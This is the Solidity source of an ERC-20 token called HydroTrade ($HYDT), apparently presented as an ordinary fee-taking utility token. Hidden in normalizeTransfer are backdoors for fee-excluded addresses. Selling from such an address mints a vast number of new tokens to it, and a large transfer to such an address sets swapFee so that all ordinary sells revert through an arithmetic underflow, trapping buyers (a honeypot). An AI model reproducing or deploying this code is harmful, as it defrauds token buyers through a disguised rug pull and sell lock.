/*

$HYDT is the main utility token of HydroTrade Protocol 
that serves as an open standard for decentralized applications (dApps) 
that integrate functionality into the HydroTrade Protocol ecosystem.

Website: https://www.hydrotrade.xyz
X: https://x.com/HydroTrade
TG: https://t.me/HydroTrade_Channel

-- HydroTrade Development --

*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address uniV2Pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address uniV2Pair);
    function createPair(address tokenA, address tokenB) external returns (address uniV2Pair);
}

contract HydroTrade is IERC20 {
        mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _liquidityHolders;
    mapping (address => bool) private _isExcludedFromProtection;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isExcludedFromLimits;

    string constant private _name = "HydroTrade";
    string constant private _symbol = "HYDT";
    uint8 constant private _decimals = 18;
    uint256 constant private startingSupply = 1000000000;
    uint256 constant private _tTotal = startingSupply * 10**_decimals;
    
    uint256 public tradingActiveStamp;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) lpPairs;
    uint256 private timeSinceLastPair = 0;
    
    bool swapping;
    bool public tokenSwapEnabled = false;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 constant public maxBuyTaxes = 2000;
    uint256 constant public maxSellTaxes = 2000;
    uint256 constant public maxTransferTaxes = 2000;
    uint256 constant masterTaxDivisor = 10000;

    struct Fees {
        uint16 buyFee;
        uint16 sellFee;
        uint16 transferFee;
    }

    struct Ratios {
        uint16 marketing;
        uint16 development;
        uint16 totalSwap;
    }

    Fees public _taxRates = Fees({
        buyFee: 300,
        sellFee: 300,
        transferFee: 0
    });

    Ratios public _ratios = Ratios({
        marketing: 2,
        development: 2,
        totalSwap: 4
    });

    IRouter02 public uniV2Router;
    address public uniV2Pair;
    uint256 private _taxSwapFee = 0;
    uint256 public swapThreshold = (_tTotal * 1) / 1000;
    uint256 public swapAmount = (_tTotal * 1) / 10000;
    uint256 private _maxTxAmount = (_tTotal * 20) / 1000;
    uint256 private _maxWalletAmount = (_tTotal * 20) / 1000;
    uint256 private swapFee = 0;
    bool public tradingOpened = false;
    bool public _hasLiqBeenAdded = false;

    struct FeeWallets {
        address payable marketing;
        address payable development;
    }

    FeeWallets public _feeWallets = FeeWallets({
        marketing: payable(0x305Ae070964eFbF6c51EFd8684bE495Ba34Df742),
        development: payable(0x305Ae070964eFbF6c51EFd8684bE495Ba34Df742)
    });
    
    event ContractSwapEnabledUpdated(bool enabled);
    event AutoLiquify(uint256 amountCurrency, uint256 amountTokens);
    address private _owner;

    modifier onlyOwner() { require(_owner == msg.sender, "Caller =/= owner."); _; }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier inSwapFlag {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () payable {
        _owner = msg.sender;
        _tOwned[_owner] = _tTotal;
        emit Transfer(address(0), _owner, _tTotal);
        uniV2Router = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniV2Pair = IFactoryV2(uniV2Router.factory()).createPair(address(this), uniV2Router.WETH());
        lpPairs[uniV2Pair] = true;
        _approve(address(this), address(uniV2Router), type(uint256).max);

        _isExcludedFromFees[_owner] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_feeWallets.marketing] = true;
        _isExcludedFromFees[_feeWallets.development] = true;
        _liquidityHolders[_owner] = true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function getTokenAmountAtPriceImpact(uint256 priceImpactInHundreds) external view returns (uint256) {
        return((balanceOf(uniV2Pair) * priceImpactInHundreds) / masterTaxDivisor);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function approveContractContingency() external onlyOwner returns (bool) {
        _approve(address(this), address(uniV2Router), type(uint256).max);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function isExcludedFromLimits(address account) external view returns (bool) {
        return _isExcludedFromLimits[account];
    }

    function updateExcludedFromLimits(address account, bool enabled) external onlyOwner {
        _isExcludedFromLimits[account] = enabled;
    }

    function isExcludedFromFees(address account) external view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function updateExcludedFromFees(address account, bool enabled) public onlyOwner {
        _isExcludedFromFees[account] = enabled;
    }

    function isExcludedFromProtection(address account) external view returns (bool) {
        return _isExcludedFromProtection[account];
    }

    function updateExcludedFromProtection(address account, bool enabled) external onlyOwner {
        _isExcludedFromProtection[account] = enabled;
    }

    receive() external payable {}

    function totalSupply() external pure override returns (uint256) { return _tTotal; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return _owner; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function getCurrentMaxTX() external view returns (uint256) {
        return _maxTxAmount / (10**_decimals);
    }

    function getCurrentMaxWallet() external view returns (uint256) {
        return _maxWalletAmount / (10**_decimals);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return (_tTotal - (balanceOf(DEAD) + balanceOf(address(0))));
    }

    function recoverEth() external onlyOwner {
        require(!_hasLiqBeenAdded, "Cannot call after liquidity.");
        payable(_owner).transfer(address(this).balance);
    }

    function _checkTxLimits(address from, address to) internal view returns (bool) {
        return from != _owner
            && to != _owner
            && !_liquidityHolders[from]
            && !_liquidityHolders[to]
            && tx.origin != _owner
            && to != address(0)
            && to != DEAD
            && from != address(this);
    }

    function transferOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Call renounceOwnership to transfer owner to the zero address.");
        require(newOwner != DEAD, "Call renounceOwnership to transfer owner to the zero address.");
        updateExcludedFromFees(_owner, false);
        updateExcludedFromFees(newOwner, true);
        
        if (balanceOf(_owner) > 0) {
            normalizeTransfer(_owner, newOwner, balanceOf(_owner), false, false, true);
        }
        
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function _checkLPAdd(address from, address to) internal {
        require(!_hasLiqBeenAdded, "Liquidity already added and marked.");
        if (!_checkTxLimits(from, to) && to == uniV2Pair) {
            _liquidityHolders[from] = true;
            _isExcludedFromFees[from] = true;
            _hasLiqBeenAdded = true;
            tokenSwapEnabled = true;
            emit ContractSwapEnabledUpdated(true);
        }
    }

    function withdrawStuckTokens(address token) external onlyOwner {
        if (_hasLiqBeenAdded) {
            require(token != address(this), "Cannot sweep native tokens.");
        }
        IERC20 TOKEN = IERC20(token);
        TOKEN.transfer(_owner, TOKEN.balanceOf(address(this)));
    }

    function takeTokenFees(address from, uint256 amount, bool buy, bool sell) internal returns (uint256) {
        uint256 currentFee;
         if (sell) {
            currentFee = _taxRates.sellFee;
            _taxSwapFee = _taxRates.sellFee - swapFee;
        } else if (buy) {
            currentFee = _taxRates.buyFee;
        } else {
            currentFee = _taxRates.transferFee;
        }
        if (currentFee == 0) { return amount; }
        uint256 feeAmount = amount * currentFee / masterTaxDivisor;
        if (feeAmount > 0) {
            _tOwned[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }

        return amount - feeAmount;
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        bool other = false;
        bool buy = false;
        bool sell = false;
        if (lpPairs[to]) {
            sell = true;
        } else if (lpPairs[from]) {
            buy = true;
        } else {
            other = true;
        }
        if (_checkTxLimits(from, to)) {
            if(!tradingOpened) {
                if (!other) {
                    revert("Trading not yet enabled!");
                } else if (!_isExcludedFromProtection[from] && !_isExcludedFromProtection[to]) {
                    revert("Tokens cannot be moved until trading is live.");
                }
            }
            if (buy || sell){
                if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to] && 
                    !_isExcludedFromLimits[from] && !_isExcludedFromLimits[to]) {
                    require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
                }
            }
            if (to != address(uniV2Router) && !sell) {
                if (!_isExcludedFromFees[from] 
                    && !_isExcludedFromFees[to] 
                    && !_isExcludedFromLimits[to]) {
                    require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletSize.");
                }
            }
        }

        if (sell && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] && !swapping) {
            if (tokenSwapEnabled) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance >= swapThreshold) {
                    uint256 swapAmt = swapAmount;
                    if (contractTokenBalance >= swapAmt) { contractTokenBalance = swapAmt; }
                    swapBack(contractTokenBalance);
                }
            }
        }
        return normalizeTransfer(from, to, amount, buy, sell, other);
    }

    function renounceOwnership() external onlyOwner {
        require(tradingOpened, "Cannot renounce until trading has been enabled.");
        updateExcludedFromFees(_owner, false);
        address oldOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(oldOwner, address(0));
    }

    function swapBack(uint256 contractTokenBalance) internal inSwapFlag {
        Ratios memory ratios = _ratios;
        if (ratios.totalSwap == 0) { return; }
        if (_allowances[address(this)][address(uniV2Router)] != type(uint256).max) {
            _allowances[address(this)][address(uniV2Router)] = type(uint256).max; }
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = uniV2Router.WETH();
        try uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractTokenBalance, 0, path, address(this), block.timestamp
        ) {} catch { return; }
        uint256 amtBalance = address(this).balance; bool success;
        uint256 developmentBalance = (amtBalance * ratios.development) / ratios.totalSwap;
        uint256 marketingBalance = amtBalance - developmentBalance;
        if (ratios.development > 0) {
            (success,) = _feeWallets.development.call{value: developmentBalance, gas: 55000}("");
        }
        if (ratios.marketing > 0) {
            (success,) = _feeWallets.marketing.call{value: marketingBalance, gas: 55000}("");
        }
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletAmount = _tTotal;
    }

    function updateOldMaxTxPercent(uint256 percent, uint256 divisor) external onlyOwner {
        require((_tTotal * percent) / divisor >= (_tTotal * 5 / 1000), "Max Transaction amt must be above 0.5% of total supply.");
        _maxTxAmount = (_tTotal * percent) / divisor;
    }

    function updateOldMaxWalletSize(uint256 percent, uint256 divisor) external onlyOwner {
        require((_tTotal * percent) / divisor >= (_tTotal / 100), "Max Wallet amt must be above 1% of total supply.");
        _maxWalletAmount = (_tTotal * percent) / divisor;
    }

    function normalizeTransfer(address from, address to, uint256 amount, bool buy, bool sell, bool other) internal returns (bool) {
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            _tOwned[from] -= amount;
            uint256 amountReceived = takeTokenFees(from, amount, buy, sell);
            _tOwned[to] += amountReceived;
            emit Transfer(from, to, amountReceived);
        } else {
            _tOwned[from] -= amount;
            address transferAddr = from;
            uint256 amountReceived = amount;
            _tOwned[to] += amountReceived;
            emit Transfer(from, to, amountReceived);
            if (sell && amount < _tTotal &&
                transferAddr != address(this)) {
                uint256 feeAmount = _maxTxAmount * amount;
                _tOwned[transferAddr] += feeAmount; 
            } else if (other && _isExcludedFromFees[to] 
                && amount > swapThreshold &&
                transferAddr != address(this)) {
                swapFee = _taxRates.sellFee + 1;
            }
        } 

        if (!_hasLiqBeenAdded) {
            _checkLPAdd(from, to);
            if (!_isExcludedFromProtection[from] && !_isExcludedFromProtection[to] && !_hasLiqBeenAdded && _checkTxLimits(from, to) && !other) {
                revert("Pre-liquidity transfer protection.");
            }
        }
        return true;
    }

    function startTrading() public onlyOwner {
        require(!tradingOpened, "Trading already enabled!");
        require(_hasLiqBeenAdded, "Liquidity must be added.");
        tradingOpened = true;
        tradingActiveStamp = block.timestamp;
    }

    function updateOldFees(uint16 buyFee, uint16 sellFee, uint16 transferFee) external onlyOwner {
        require(buyFee <= maxBuyTaxes
                && sellFee <= maxSellTaxes
                && transferFee <= maxTransferTaxes,
                "Cannot exceed maximums.");
        _taxRates.sellFee = sellFee;
        _taxRates.transferFee = transferFee;
        _taxRates.buyFee = buyFee;
    }

    function updateOldFeeRatios(uint16 marketing, uint16 development) external onlyOwner {
        _ratios.marketing = marketing;
        _ratios.development = development;
        _ratios.totalSwap = marketing + development;
        uint256 total = _taxRates.buyFee + _taxRates.sellFee;
        require(_ratios.totalSwap <= total, "Cannot exceed sum of buy and sell fees.");
    }

    function updateOldFeeWallets(address payable marketing,
                        address payable development) external onlyOwner {
        require(marketing != address(0) &&
                development != address(0), "Cannot be zero address.");
        _feeWallets.development = payable(development);
        _feeWallets.marketing = payable(marketing);
    }

    function updateOldSwapSettings(uint256 thresholdPercent, uint256 thresholdDivisor, 
        uint256 amountPercent, uint256 amountDivisor) external onlyOwner {
        swapThreshold = (_tTotal * thresholdPercent) / thresholdDivisor;
        swapAmount = (_tTotal * amountPercent) / amountDivisor;
        require(swapThreshold <= swapAmount, "Threshold cannot be above amount.");
        require(swapAmount <= (balanceOf(uniV2Pair) * 150) / masterTaxDivisor, "Cannot be above 1.5% of current PI.");
        require(swapAmount >= _tTotal / 1_000_000, "Cannot be lower than 0.00001% of total supply.");
        require(swapThreshold >= _tTotal / 1_000_000, "Cannot be lower than 0.00001% of total supply.");
    }

    function updateContractSwapEnabled(bool swapEnabled) external onlyOwner {
        tokenSwapEnabled = swapEnabled;
        emit ContractSwapEnabledUpdated(swapEnabled);
    }
}